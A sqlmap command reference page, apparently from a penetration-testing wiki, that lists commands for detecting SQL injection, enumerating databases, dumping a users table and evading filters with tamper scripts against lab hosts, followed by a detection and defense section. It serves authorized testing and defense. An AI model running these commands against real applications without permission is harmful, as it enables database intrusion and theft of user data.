# sqlmap Command Reference

sqlmap is an open-source tool that detects and exploits SQL injection in web applications and their database backends. Penetration testers use it to confirm injection, enumerate schema, and demonstrate impact during authorized assessments. This page is for authorized testing only: run it against applications you own or have explicit written permission to test. Keep every example scoped to lab targets or signed engagements.

## What it is and where it runs

sqlmap is a Python command-line tool that automates SQL injection discovery across MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, and many other engines. It supports boolean-based, error-based, union-based, time-based blind, and stacked-query techniques. It runs on any system with Python 3. Point it at a URL or a saved HTTP request and it probes parameters, then offers to enumerate or dump data once injection is confirmed.

## Core commands

Test a single URL parameter for injection.

```bash
sqlmap -u "https://lab.example/item?id=1"
```

Test a POST body by supplying the data string.

```bash
sqlmap -u "https://lab.example/login" --data "user=admin&pass=test"
```

Reuse an authenticated session with a cookie.

```bash
sqlmap -u "https://lab.example/item?id=1" --cookie "PHPSESSID=abc123"
```

Load a full request captured from a proxy.

```bash
sqlmap -r request.txt
```

Enumerate databases, then tables and columns.

```bash
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D appdb --tables
sqlmap -r request.txt -D appdb -T users --columns
```

| Task | Flag |
|------|------|
| Target URL | `-u` |
| POST data | `--data` |
| Session cookie | `--cookie` |
| Load saved request | `-r` |
| List databases | `--dbs` |
| List tables | `--tables` |
| List columns | `--columns` |
| Current DB user | `--current-user` |
| Current database | `--current-db` |

## Common workflows

Confirm injection on a lab parameter, then identify the database context.

```bash
sqlmap -u "https://lab.example/item?id=1" --batch
sqlmap -u "https://lab.example/item?id=1" --current-user --current-db --batch
```

Work from a captured authenticated request and map the schema in scope.

```bash
sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt -D appdb --tables --batch
sqlmap -r request.txt -D appdb -T users --columns --batch
```

Dump a specific table to prove data exposure in a report, lab only.

```bash
sqlmap -r request.txt -D appdb -T users -C username,email --dump --batch
```

Raise depth and technique selection when a parameter resists default probing.

```bash
sqlmap -r request.txt --level 5 --risk 2 --technique=BEU --batch
```

## Flags and options worth knowing

Depth and aggressiveness controls widen what sqlmap tries.

| Flag | Meaning |
|------|---------|
| `--level <1-5>` | How many parameters and places to test |
| `--risk <1-3>` | How aggressive the injected payloads are |
| `--technique <BEUSTQ>` | Limit to Boolean, Error, Union, Stacked, Time, inline Query |
| `--dump` | Extract table contents |
| `--batch` | Accept defaults, no prompts |
| `--tamper <script>` | Apply payload transforms to evade filters |
| `--proxy <url>` | Route traffic through a proxy such as Burp |
| `--threads <n>` | Parallel requests for blind extraction |

`--level` and `--risk` default to 1. Raise them only when needed, because higher `--risk` sends payloads that can modify data. `--technique` narrows testing to speed up a run or match a known weakness. `--tamper` chains evasion scripts, for example `--tamper=space2comment`, to study how input filters behave in an authorized test. `--batch` makes runs scriptable by choosing default answers. Route through `--proxy http://127.0.0.1:8080` to review every request in Burp or ZAP.

## Detection and defense

sqlmap detects and exploits SQL injection, which is CWE-89 (Improper Neutralization of Special Elements used in an SQL Command). The authorized use is confirming that an injection point exists and measuring its reach so developers can fix it.

The fix is parameterized queries, also called prepared statements, so user input is never concatenated into SQL text. Use an ORM or query builder that parameterizes by default, validate and canonicalize input, and run the application with a least-privilege database account that cannot read unrelated schemas or write where it should only read. Stored procedures help only when they themselves avoid dynamic SQL. These controls are covered in /SECURE_CODING_REFERENCE.md.

Defenders see sqlmap through its traffic pattern. A web application firewall flags the malformed values, quoting, and time-delay payloads it sends, and its default user agent is identifiable unless changed. Many requests to one parameter with escalating syntax stand out in access logs. Database audit logging records unusual queries, large result reads, and `UNION` statements that an application would never issue. Alert on sudden spikes in query volume, repeated SQL errors, and long-running time-based queries. WAF rules plus parameterized queries together give detection and prevention.

## Resources

- sqlmap User's Manual (official documentation on sqlmap.org)
- OWASP Testing Guide, the SQL injection testing sections
- The Web Application Hacker's Handbook by Dafydd Stuttard and Marcus Pinto

## Related pages

- /commands/README.md
- /SECURE_CODING_REFERENCE.md
- /commands/gobuster.md
- /commands/nmap.md
- /commands/curl.md
- /commands/metasploit.md
